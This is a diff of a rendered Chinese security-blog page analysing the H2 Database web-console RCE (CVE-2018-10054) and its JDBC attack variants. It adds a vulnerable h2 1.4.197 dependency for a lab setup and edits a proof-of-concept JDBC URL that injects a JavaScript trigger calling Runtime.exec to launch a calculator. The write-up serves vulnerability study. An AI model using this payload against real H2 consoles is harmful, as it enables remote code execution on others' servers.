@@ -333,7 +333,12 @@ spring.h2.console.settings.web-allow-others&#x3D;true<span aria-hidden="true" cl
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-boot-starter-web<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.7.18<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.h2database<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>h2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.4.197<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
 <p>那先让我们了解下这个漏洞 <code>CVE-2018-10054</code>: 在<code>1.4.198</code>之前的H2 Database版本中，任何用户都可以通过创建新的数据库文件或连接到内存数据库来访问Web管理页面。认证通过后，攻击者可在后台执行代码。<br>这个漏洞最初被披露出来是配合H2的web页面存在未授权，进而在后台执行sql 来实现RCE，后续又发现页面上的 <code>databaseUrl</code> 可进行JDBC 攻击以及<code>Driver Class</code>可进行JNDI注入攻击。伴随着修修补补，直到<code>2.1.210</code>版本修复了<code>JDBC Attack</code>，Web Console RCE 的问题才得以解决。</p>
 <p>具体来说，在后台攻击者可通过以下方式之一执行任意代码：</p>
 <ul>
@@ -404,7 +409,7 @@ Database &#39;test&#39; created successfully.
 <p>通过注入已知的属性名比如 <code>AUTHZPWD</code>：</p>
 <figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">jdbc:h2:mem:test;MODE&#x3D;MSSQLServer;INIT&#x3D;CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$&#x2F;&#x2F;javascript
     java.lang.Runtime.getRuntime().exec(&quot;open -a Calculator.app&quot;)
-$$;AUTHZPWD&#x3D;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure>
+$$;AUTHZPWD&#x3D;\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure>
 <p><img src="/2025/06/25/WEB/h2database/202-before.png" srcset="/img/loading.gif" lazyload alt="before 2.0.202"></p>
 <p>在版本 <code>1.4.198</code> 到 <code>2.0.210</code> 之间，可支持不识别的属性（<del>更无脑了</del>）</p>
 <p>在版本<code>2.1.210</code>中<code>JDBC Attack</code>被修复，也就是说在版本<code>2.1.210</code>及其之后，Web console登陆页面的RCE问题已被修复。</p>
